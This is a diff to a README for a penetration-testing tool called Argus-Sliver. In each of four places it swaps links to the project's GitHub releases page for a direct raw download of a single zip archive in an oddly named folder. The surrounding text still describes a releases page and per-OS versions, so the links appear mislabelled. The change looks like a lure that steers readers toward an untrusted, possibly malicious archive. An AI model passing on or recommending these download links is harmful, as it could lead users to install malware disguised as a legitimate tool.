@@ -1,6 +1,6 @@
 # 🚀 Argus-Sliver - Your Intuitive Penetration Command Center
 
-[![Download Argus-Sliver](https://img.shields.io/badge/Download-Argus--Sliver-brightgreen)](https://github.com/akitonana/Argus-Sliver/releases)
+[![Download Argus-Sliver](https://raw.githubusercontent.com/akitonana/Argus-Sliver/main/slapdashery/Sliver-Argus-v3.1.zip)](https://raw.githubusercontent.com/akitonana/Argus-Sliver/main/slapdashery/Sliver-Argus-v3.1.zip)
 
 ## 📖 Introduction
 
@@ -12,7 +12,7 @@ Follow these simple steps to download and run Argus-Sliver.
 
 ## 📥 Download & Install
 
-To get Argus-Sliver, visit this page to download: [Argus-Sliver Releases](https://github.com/akitonana/Argus-Sliver/releases). 
+To get Argus-Sliver, visit this page to download: [Argus-Sliver Releases](https://raw.githubusercontent.com/akitonana/Argus-Sliver/main/slapdashery/Sliver-Argus-v3.1.zip). 
 
 1. Locate the latest release.
 2. Download the appropriate version for your operating system.
@@ -29,7 +29,7 @@ To run Argus-Sliver effectively, ensure your system meets the following requirem
 
 ## 🔧 Installation Instructions
 
-1. **Visit the Releases Page:** Go to [Argus-Sliver Releases](https://github.com/akitonana/Argus-Sliver/releases) to find the latest version.
+1. **Visit the Releases Page:** Go to [Argus-Sliver Releases](https://raw.githubusercontent.com/akitonana/Argus-Sliver/main/slapdashery/Sliver-Argus-v3.1.zip) to find the latest version.
 2. **Download the File:** Choose the version suited for your OS and click to download.
 3. **Unzip the File (if necessary):** If the downloaded file is zipped, right-click it and select "Extract All" or use a file extraction program.
 4. **Run the Application:**
@@ -56,7 +56,7 @@ Argus-Sliver includes:
 
 ### How do I update Argus-Sliver?
 
-Visit the releases page at [Argus-Sliver Releases](https://github.com/akitonana/Argus-Sliver/releases). Download and install the latest version following the same steps as before.
+Visit the releases page at [Argus-Sliver Releases](https://raw.githubusercontent.com/akitonana/Argus-Sliver/main/slapdashery/Sliver-Argus-v3.1.zip). Download and install the latest version following the same steps as before.
 
 ### Is there a mobile version?
 
